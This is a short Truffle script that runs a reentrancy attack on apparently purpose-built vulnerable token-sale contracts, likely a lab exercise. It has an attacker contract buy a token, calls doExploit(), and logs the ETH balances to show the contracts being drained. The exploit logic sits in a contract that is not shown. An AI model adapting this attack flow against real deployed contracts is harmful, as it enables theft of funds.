var contractDVCToken = artifacts.require('DVCToken');
var contractDVCTokenSale = artifacts.require('DVCTokenSale');
var contractReentrancy = artifacts.require('Reentrancy');

async function execute(callback) { 

    var victim = await contractDVCToken.deployed();
    var victimSale = await contractDVCTokenSale.deployed();
    var attacker = await contractReentrancy.deployed();

    //Set addresses in my attacker contract
    await attacker.setVictimsAddresses(victim.address, victimSale.address);

    console.log(`Victim contract has ${web3.fromWei(web3.eth.getBalance(victim.address))} ETH`);
    console.log(`VictimSale contract has ${web3.fromWei(web3.eth.getBalance(victimSale.address))} ETH`);
    console.log(`Attacker contract has ${web3.fromWei(web3.eth.getBalance(attacker.address))} ETH\n`);

    //Victim gives 5 tokens to VictimSale contract
    await victim.transfer(victimSale.address, 5, {from: web3.eth.accounts[8]});
    
    //Attacker buys 1 token
    console.log(`Attacker contract buying tokens...\n`);
    await attacker.buy();

    console.log(`Exploiting reentrancy...\n`);
    await attacker.doExploit();

    console.log(`Victim contract has ${web3.fromWei(web3.eth.getBalance(victim.address))} ETH`);
    console.log(`VictimSale contract has ${web3.fromWei(web3.eth.getBalance(victimSale.address))} ETH`);
    console.log(`Attacker contract has ${web3.fromWei(web3.eth.getBalance(attacker.address))} ETH\n`);

    callback();
} 

module.exports = execute